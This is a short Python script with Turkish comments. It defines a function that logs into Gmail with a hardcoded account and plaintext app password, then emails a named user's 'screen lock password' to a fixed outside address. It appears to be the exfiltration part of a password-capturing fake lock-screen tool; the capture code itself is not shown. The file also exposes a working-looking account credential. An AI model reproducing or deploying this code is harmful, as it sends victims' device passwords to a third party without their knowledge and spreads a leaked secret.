import smtplib, ssl
from email.mime.text import MIMEText
from time import sleep

# gmail smtp ssl server bilgileri
port = 465
password = "nvdrlysnumajjuuq"

context = ssl.create_default_context()
sender = "screenlockpython@gmail.com"
recipient = "eylulsarecomez6@gmail.com"

# gelen bilgileri tanımlanan mail adresine gönderiyoruz.
def mailgonder(kullanici, mesaj):
    with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
        server.login(sender, password)
        msg = MIMEText(f"{kullanici} adlı kullanıcının ekran kilidi şifresi: {mesaj}", "plain")
        server.sendmail(sender, recipient, msg.as_string())
